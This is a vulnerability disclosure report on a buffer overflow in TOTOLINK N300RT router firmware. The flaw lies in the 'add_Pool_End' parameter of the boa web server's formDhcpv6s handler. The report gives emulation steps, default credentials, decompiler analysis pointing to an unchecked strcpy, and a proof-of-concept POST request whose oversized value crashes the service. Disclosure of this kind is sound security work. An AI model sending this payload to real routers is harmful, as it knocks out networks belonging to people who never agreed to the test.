## **Description**

A buffer overflow vulnerability was discovered in the TOTOLINK firmware N300RT-Ad-V4.0.0-B20211109.1137. The vulnerability arises from the improper input validation of the `'add_Pool_End'` parameter in the 'formDhcpv6s' interface of the file boa.

## ​**Affected Product**

- ​**Brand**: TOTOLINK
- ​**Product**: N300RT
- ​**Version**: V4.0.0-B20211109.1137

The firmware can be downloaded from the official website.  
The vulnerability was confirmed using ​**FirmAE** for firmware emulation:

```sh
sudo ./run.sh -d totolink ../FIRMWARE/TOTOLINK-N300RT-Ad-V4.0.0-B20211109.1137.web
```

**Default credentials**:

- ​**Username**: `admin`
- ​**Password**: `admin`

The result of the simulation is as follows: 
![sim_res](./img/sim_res.png)

## ​**Vulnerability Analysis**

### ​**Key Vulnerable Code**

Using ghidra we known that the vulnerability code in function 'FUN_0044f0b8' is below:
![vulner_code.png](./img/vulner_code.png)
Because of the problem of ghidra decompilation, the code in `FUN_00402610()` should actually use the strcpy function to copy the parameters obtained by POST to an address.
![vulner_code_1.png](./img/vulner_code_1.png)
- ​**web_get_var** retrieves POST parameters.
- **strcpy()** is used without length checks, leading to a ​buffer overflow.​

## **Proof of Concept (PoC)**
### ​**Exploit Request**
We use burpsuite to capture a normal POST packet for test.
Example package
```http
POST /boafrm/formDhcpv6s HTTP/1.1  
Host: 192.168.0.1  
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
Accept-Encoding: gzip, deflate  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 313  
Origin: http://192.168.0.1
Connection: close  
Referer: http://192.168.0.1/tcpipwan.htm
Upgrade-Insecure-Requests: 1  
  
enabledpchv6s=1&add_Pool_End=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

After the request the `boa` process will crash.
![result](./img/result.png)